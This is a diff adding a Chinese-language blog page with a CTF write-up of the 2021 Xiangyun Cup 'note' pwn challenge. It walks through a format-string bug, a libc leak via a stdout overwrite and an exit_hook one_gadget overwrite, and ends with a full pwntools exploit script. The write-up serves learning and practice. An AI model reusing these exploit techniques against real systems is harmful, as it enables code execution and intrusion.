@@ -1,0 +1,441 @@
+
+
+<!DOCTYPE html>
+<html lang="en" color-mode=light>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>2021祥云杯PWN - ShouCheng</title>
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="google" content="notranslate" />
+  
+  <meta name="description" content="以下是我根据大佬的wp一点点复现的，比赛时，太菜了，都...">
+  <meta name="author" content="ShouCheng">
+  <link rel="icon" href="/images/icons/favicon-16x16.png" type="image/png" sizes="16x16">
+  <link rel="icon" href="/images/icons/favicon-32x32.png" type="image/png" sizes="32x32">
+  <link rel="apple-touch-icon" href="/images/icons/apple-touch-icon.png" sizes="180x180">
+  <meta rel="mask-icon" href="/images/icons/stun-logo.svg" color="#333333">
+  
+    <meta rel="msapplication-TileImage" content="/images/icons/favicon-144x144.png">
+    <meta rel="msapplication-TileColor" content="#000000">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1445822_r673sha78lq.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  
+
+  
+    
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/xcode.min.css" name="highlight-style" mode="light">
+
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/solarized-dark.min.css" name="highlight-style" mode="dark">
+
+      
+  
+
+  <script>
+    var CONFIG = window.CONFIG || {};
+    var ZHAOO = window.ZHAOO || {};
+    CONFIG = {
+      isHome: false,
+      fancybox: true,
+      pjax: false,
+      lazyload: {
+        enable: true,
+        only_post: 'false',
+        loading: '[object Object]'
+      },
+      donate: {
+        enable: false,
+        alipay: '',
+        wechat: ''
+      },
+      galleries: {
+        enable: true
+      },
+      fab: {
+        enable: true,
+        always_show: false
+      },
+      carrier: {
+        enable: true
+      },
+      daovoice: {
+        enable: true
+      },
+      preview: {
+        background: {
+          default: '',
+          api: ''
+        },
+        motto: {
+          default: '总之岁月漫长，然而值得等待！',
+          typing: true,
+          api: 'https://v2.jinrishici.com/one.json',
+          data_contents: '["data","content"]'
+        },
+      },
+      qrcode: {
+        enable: true,
+        type: 'url',
+        image: '',
+      },
+      toc: {
+        enable: true
+      },
+      scrollbar: {
+        type: 'default'
+      },
+      notification: {
+        enable: true,
+        delay: 4500,
+        list: '',
+        page_white_list: '',
+        page_black_list: ''
+      },
+      search: {
+        enable: true,
+        path: '/search.xml'
+      }
+    }
+  </script>
+
+  
+
+  
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="lock-screen">
+  <div class="loading"></div>
+  
+    
+
+
+  <nav class="navbar">
+    <div class="left">
+      
+        <i class="iconfont iconhome j-navbar-back-home"></i>
+      
+      
+        <i class="iconfont iconqrcode j-navbar-qrcode"></i>
+      
+      
+        <i class="iconfont iconmoono" id="color-toggle" color-toggle="light"></i>
+      
+      
+        <i class="iconfont iconsearch j-navbar-search"></i>
+      
+    </div>
+    <div class="center">2021祥云杯PWN</div>
+    <div class="right">
+      <i class="iconfont iconmenu j-navbar-menu"></i>
+    </div>
+    
+      <div id="qrcode-navbar"></div>
+    
+  </nav>
+
+  
+  
+
+<nav class="menu">
+  <div class="menu-container">
+    <div class="menu-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <ul class="menu-content"><li class="menu-item">
+        <a href="/ " class="underline "> 首页</a>
+      </li><li class="menu-item">
+        <a href="/galleries/ " class="underline "> 摄影</a>
+      </li><li class="menu-item">
+        <a href="/archives/ " class="underline "> 归档</a>
+      </li><li class="menu-item">
+        <a href="/tags/ " class="underline "> 标签</a>
+      </li><li class="menu-item">
+        <a href="/categories/ " class="underline "> 分类</a>
+      </li><li class="menu-item">
+        <a href="/about/ " class="underline "> 关于</a>
+      </li></ul>
+    
+      <div class="menu-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+    
+  </div>
+</nav>
+  <main id="main">
+  <div class="article-wrap">
+    <div class="row container">
+      <div class="col-xl-3"></div>
+      <div class="col-xl-6"><article class="article">
+  <div class="wrap">
+    <section class="head">
+  <img   class="lazyload" data-original="/images/theme/post-image.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
+  <div class="head-mask">
+    <h1 class="head-title">2021祥云杯PWN</h1>
+    <div class="head-info">
+      <span class="post-info-item"><i class="iconfont iconcalendar"></i>September 03, 2021</span>
+      
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>1983</span>
+    </div>
+  </div>
+</section>
+    <section class="main">
+      <section class="content">
+        <p>以下是我根据大佬的wp一点点复现的，比赛时，太菜了，都没做出来。下面两个链接是大佬的wp</p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/402722060">https://zhuanlan.zhihu.com/p/402722060</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/_jPCp1U9c6EaGa4S2cx2mQ">https://mp.weixin.qq.com/s/_jPCp1U9c6EaGa4S2cx2mQ</a></p>
+<h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><p><img   class="lazyload" data-original="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210903160536437.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210903160536437</span></p>
+<p>常规checksec一下，64位，保护全开</p>
+<p>进入IDA看看，程序很简单，就不细说了。主要说下漏洞点</p>
+<p><img   class="lazyload" data-original="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210903160656584.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210903160656584</span></p>
+<p>在修改功能函数里面，存在scanf(buf)，存在格式化字符串漏洞，然后这边的要去计算偏移，一定要去相应版本的Ubuntu下去动态调试，我刚开始是在20.04下调试，偏移不对。然后这边调试技巧：因为程序开pie了，所以我们可以先输入start指令，会断在开头，这时候可以获取当前的pie，才能断点在相应的位置</p>
+<p><img   class="lazyload" data-original="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210903161041335.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210903161041335</span></p>
+<p>可以计算出偏移是6，并且在底下就存在着残留的stdout指针，此时stdout指针的偏移是7，所以第一个buf就是<code>%7$s</code>那么可以修改stdout从而泄露libc地址</p>
+<p><img   class="lazyload" data-original="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210903162610572.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210903162610572</span></p>
+<p>吐出了一大堆数据，接收即可。</p>
+<p>然后去劫持exit_hook中的_dl_rtld_lock_recursive为one_gadget，当调用exit函数时可得到shell</p>
+<p><img   class="lazyload" data-original="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210903171325616.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210903171325616</span></p>
+<p>而要找到这个偏移，要去_rtld_global中寻找</p>
+<p>计算可得偏移为0x5F0F48</p>
+<p>这边我是在本地调试的，我收到的libc的距离libc基址的偏移与wp的不太一样，是为479552，然后就是再次借用格式化字符串漏洞，前面说过了，格式化字符串处在第六个偏移，那么我们填满八个字节，然后把获得的rtld_lock地址跟在后面填入，就变为第七个偏移，之后就能在上面写入one_gadget，最后执行exit(0)getshell</p>
+<p><img   class="lazyload" data-original="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210903174509942.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20210903174509942</span></p>
+<p>成功getshell</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br>elf = ELF(<span class="hljs-string">&#x27;./note&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = process(argv=[elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>:libc.path&#125;)<br><br>def <span class="hljs-builtin-name">debug</span>():<br>	gdb.attach(p)<br>def <span class="hljs-builtin-name">add</span>(size, content):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;size:&#x27;</span>, str(size))<br>    p.sendlineafter(<span class="hljs-string">&#x27;content:&#x27;</span>, content)<br><br><span class="hljs-builtin-name">add</span>(0x20,<span class="hljs-string">&#x27;a&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;say ? &#x27;</span>,<span class="hljs-string">&#x27;%7$s\x00&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;? &#x27;</span>,p64(0xfbad1800) + p64(0) * 3 + <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-6:].ljust(8,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - 479552<br><span class="hljs-builtin-name">print</span>(<span class="hljs-string">&quot;libc=&gt;&quot;</span>,hex(libc_base))<br><span class="hljs-builtin-name">debug</span>()<br>ogg = libc_base + 0xf1247<br>rtld_lock = libc_base + 0x5F0F48<br>p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;say ? &#x27;</span>,<span class="hljs-string">&#x27;%7$s\x00&#x27;</span>.ljust(8,<span class="hljs-string">&#x27;\x00&#x27;</span>) + p64(rtld_lock))<br>p.sendlineafter(<span class="hljs-string">&#x27;? &#x27;</span>,p64(ogg))<br>p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+      </section>
+      <section class="extra">
+        
+          <ul class="copyright">
+  
+    <li><strong>本文作者：</strong>ShouCheng</li>
+    <li><strong>本文链接：</strong><a href="http://example.com/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/index.html" title="http:&#x2F;&#x2F;example.com&#x2F;2021&#x2F;09&#x2F;03&#x2F;2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN&#x2F;index.html">http:&#x2F;&#x2F;example.com&#x2F;2021&#x2F;09&#x2F;03&#x2F;2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN&#x2F;index.html</a></li>
+    <li><strong>版权声明：</strong>本博客所有文章均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" title="BY-NC-SA" target="_blank" rel="noopener">BY-NC-SA</a> 许可协议，转载请注明出处！</li>
+  
+</ul>
+        
+        
+        
+  <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/" rel="tag">祥云杯PWN</a></li></ul> 
+
+        
+  <nav class="nav">
+    <a></a>
+    <a href="/2021/08/30/2021-08-30-libc%E7%89%88%E6%9C%AC%E6%A3%80%E6%9F%A5%E6%9C%BA%E5%88%B6/">libc版本检查机制<i class="iconfont iconright"></i></a>
+  </nav>
+
+      </section>
+      
+        <section class="comments">
+  
+    <div class="btn" id="comments-btn">查看评论</div>
+  
+  
+</section>
+      
+    </section>
+  </div>
+</article></div>
+      <div class="col-xl-3">
+        
+          
+  <aside class="toc-wrap">
+    <h3 class="toc-title">文章目录：</h3>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#note"><span class="toc-text">note</span></a></li></ol>
+  </aside>
+
+        
+      </div>
+    </div>
+  </div>
+</main>
+  
+
+<footer class="footer">
+  <div class="footer-social"><a 
+        href="tencent://message/?Menu=yes&uin=1145020611 "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#12B7F5'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconQQ "></i>
+      </a><a 
+        href="javascript:; "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#09BB07'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconwechat-fill "></i>
+      </a><a 
+        href="https://www.instagram.com/izhaoo/ "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#DA2E76'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconinstagram "></i>
+      </a><a 
+        href="https://shoucheng3.github.io "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#9f7be1'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  icongithub-fill "></i>
+      </a><a 
+        href="mailto:1145020611@qq.com "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color=#FF3B00" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconmail"></i>
+      </a></div>
+  
+    <div class="footer-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+  
+</footer>
+  
+      <div class="fab fab-plus">
+    <i class="iconfont iconplus"></i>
+  </div>
+  
+    <div class="fab fab-daovoice">
+      <i class="iconfont iconcomment"></i>
+    </div>
+  
+  
+    <a href="https://support.qq.com/product/325288# app_id" target="_blank">
+      <div class="fab fab-tencent-chao">
+        <i class="iconfont iconcomment"></i>
+      </div>
+    </a>
+  
+  <div class="fab fab-up">
+    <i class="iconfont iconcaret-up"></i>
+  </div>
+  
+  
+  
+    
+<script src="/js/color-mode.js"></script>
+
+  
+  
+    <div class="search">
+  <div class="search-container">
+    <div class="search-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <div class="search-input-wrapper">
+      <i class="search-input-icon iconfont iconsearch"></i>
+      <input class="search-input" type="search" id="search-input" placeholder="Search..." autofocus autocomplete="off"
+        autocorrect="off" autocapitalize="off">
+    </div>
+    <div class="search-output" id="search-output"></div>
+  </div>
+</div>
+  
+</body>
+
+<script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
+
+
+
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.qrcode/1.0/jquery.qrcode.min.js"></script>
+
+
+
+
+<script src="/js/utils.js"></script>
+<script src="/js/script.js"></script>
+
+
+
+
+
+  
+
+<script>
+  (function (i, s, o, g, r, a, m) {
+    i["DaoVoiceObject"] = r;
+    i[r] = i[r] || function () {
+      (i[r].q = i[r].q || []).push(arguments)
+    }, i[r].l = 1 * new Date();
+    a = s.createElement(o), m = s.getElementsByTagName(o)[0];
+    a.async = 1;
+    a.src = g;
+    a.charset = "utf-8";
+    m.parentNode.insertBefore(a, m)
+  })(window, document, "script", "https://widget.daovoice.io/widget/0f81ff2f.js", "daovoice")
+  daovoice('init', {
+    app_id: "3abd194f# app_id"
+  }, {
+    launcher: {
+      disableLauncherIcon: true,
+    },
+  });
+  daovoice('update');
+</script>
+
+
+
+  <script>
+    (function () {
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      } else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</html>
